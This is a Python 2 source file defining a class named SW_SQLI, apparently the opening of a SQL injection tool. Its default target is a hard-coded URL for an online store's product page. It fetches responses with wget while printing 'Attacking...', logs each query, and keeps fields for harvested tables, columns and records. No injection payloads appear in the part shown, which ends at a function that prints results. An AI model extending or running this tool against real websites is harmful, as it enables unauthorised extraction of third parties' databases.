import re
import urllib2
import webbrowser
import socket
import wget
import os
import binascii
from urllib import urlencode
from sys import argv, exit

class SW_SQLI():
	params = {}
	def __init__(self):
		self.initialize()
		
	def __del__(self):
		self.releaseResource()
		
	def initialize(self):
		self.params['link'] = 'http://shopkenpaves.com/store.php?p1=0.00&p2=9 '
		self.params['table'] = ''
		self.params['column'] = ''
		self.params['data'] = ''
		self.params['info'] = ''
		self.params['numoftable'] = 0
		self.params['numofcolumn'] = 0
		self.params['numofrecord'] = 0
		self.params['log'] = open('log.txt','w')
	
	def setLink(self,link):
		self.params['link'] = link

	def progressIndicator(self,a,b,c):
		print "Attacking..."
		
	def doQuery(self,url):
		self.logQuery(url)
		htmlRes = ''
		filename = wget.download(url,bar=self.progressIndicator)
		f = open(filename)
		htmlRes = f.read()
		f.close()
		try:
			os.remove("debug.html")
		except:
			print ""
		os.rename(filename,"debug.html")
		print "\n"
		return htmlRes

	def logQuery(self,q):
		self.params['log'].write(q + "\n")
		
	def releaseResource(self):
		print "CAM ON BAN DA SU DUNG!"
		try:
			os.remove("debug.html")
		except:
			print ""
		try:
			self.params['log'].close()
		except:
			print ""

	def printInfo(self):
		print "Link -->" + self.params['link'] + "\n"
		print "Info: \n" + self.params['info'] + "\n"
		print "Tables: \n" + self.params['table'] + "\n"
		print "Columns: \n" + self.params['column'] + "\n"